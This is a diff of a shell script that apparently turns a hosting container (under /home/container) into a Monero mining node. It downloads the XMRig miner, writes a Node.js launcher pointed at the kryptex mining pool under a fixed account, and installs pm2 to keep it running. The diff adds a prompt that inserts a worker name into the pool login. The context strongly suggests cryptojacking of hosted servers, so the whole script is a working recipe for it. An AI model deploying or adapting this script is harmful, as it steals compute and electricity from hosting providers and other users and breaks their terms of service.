@@ -1,5 +1,7 @@
 #!/bin/sh
 
+echo "Enter Name"
+read name
 ROOTFS_DIR=/home/container
 ALPINE_VERSION="3.18"
 ALPINE_FULL_VERSION="3.18.3"
@@ -53,13 +55,13 @@ apk add --no-cache libuv-dev openssl-dev hwloc-dev nodejs npm
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O xmrig.tar.gz
 tar -xvzf xmrig.tar.gz
 cd xmrig-6.22.2
-cat > srv.js <<'EOL'
+cat > srv.js <<EOL
 const { spawn } = require('child_process');
 
 const command = './xmrig';
 const args = [
   '-o', 'xmr.kryptex.network:7777',
-  '-u', 'pimik@send-email.pro/pimik1',
+  '-u', 'pimik@send-email.pro/${name}',
   '-k',
   '--coin', 'monero',
   '-a', 'rx/0'
@@ -68,15 +70,15 @@ const args = [
 const child = spawn(command, args);
 
 child.stdout.on('data', (data) => {
-  console.log(`stdout: ${data}`);
+  console.log(\`stdout: \${data}\`);
 });
 
 child.stderr.on('data', (data) => {
-  console.error(`stderr: ${data}`);
+  console.error(\`stderr: \${data}\`);
 });
 
 child.on('close', (code) => {
-  console.log(`Процесс завершен с кодом ${code}`);
+  console.log(\`Процесс завершен с кодом \${code}\`);
 });
 EOL
 npm i -g pm2
